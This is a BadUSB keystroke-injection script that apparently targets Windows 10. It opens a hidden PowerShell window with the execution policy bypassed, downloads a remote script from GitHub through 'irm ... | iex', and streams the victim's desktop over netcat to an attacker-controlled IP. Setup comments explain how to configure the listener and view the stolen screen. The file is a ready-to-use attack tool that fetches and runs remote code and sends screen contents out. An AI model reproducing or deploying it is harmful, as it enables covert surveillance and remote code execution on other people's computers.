// Title: Beigeworm's Screenshare Through Netcat 
// Author: @beigeworm
// Description: This script connects target computer with a netcat session to send a stream of the desktop to a browser window.
// Target: Windows 10
// *SETUP*
// replace YOUR_IP_HERE with your netcat attacker IP Address.
// Run script on target Windows system.
// On a Linux box use this command > nc -lvnp 9000 | nc -lvnp 8080 (Netcat is required)
// Then in a firefox browser on the Linux box > http://localhost:8080

// script setup
layout("us")

// Open Powershell and download script
delay(1000);
press("GUI r");
delay(1000);
type("powershell -NoP -Ep Bypass -W H -C $ip='YOUR_IP_HERE'; irm https://raw.githubusercontent.com/beigeworm/PwnPi-Scripts/main/Fast-Execution/Netcat-Screenshare/main.ps1 | iex");
delay(500);
press("ENTER");